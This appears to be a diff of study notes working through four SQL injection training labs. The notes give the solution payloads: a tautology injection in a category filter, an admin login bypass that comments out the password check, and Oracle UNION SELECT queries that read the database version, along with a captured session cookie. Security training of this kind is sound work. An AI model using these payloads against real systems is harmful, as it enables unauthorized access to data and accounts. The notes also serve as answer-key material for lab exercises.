@@ -1,5 +1,5 @@
 SQL injection
-_________________________________________________________________________________________
+____________________________________________________________________________________________________________________________
 Lab1.Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
 
 SELECT * FROM products WHERE category = 'Gifts' AND released = 1
@@ -7,14 +7,14 @@ SELECT * FROM products WHERE category = 'Gifts' AND released = 1
 Ans :" GET /filter?category='+or+1%3d1-- HTTP/2 "
 SELECT * FROM products WHERE category = 'Gifts' or 1=1 --
 
-_________________________________________________________________________________________
+____________________________________________________________________________________________________________________________
 Lab2 : Lab: SQL injection vulnerability allowing login bypass
        select user from users where username='admin' and password='xyzz';
 
 Ans :  select user from users where username='admin' -- ;
        Set-Cookie: session=97DAaA1HHJNKuXkRqL6HoyyNuaDbeHj1; 
 
-_________________________________________________________________________________________
+____________________________________________________________________________________________________________________________
 Lab3 : Lab: SQL injection attack, querying the database type and version on Oracle
 
 Ans  : category='
@@ -31,7 +31,7 @@ Ans  : category='
        'UNION SELECT BANNER,NULL FROM v$version--
 
 
-___________________________________________________________________________________________
+____________________________________________________________________________________________________________________________
 Lab4 : SQL injection attack, querying the database type and version on MySQL and Microsoft
 
 Ans  : GET /filter?category='
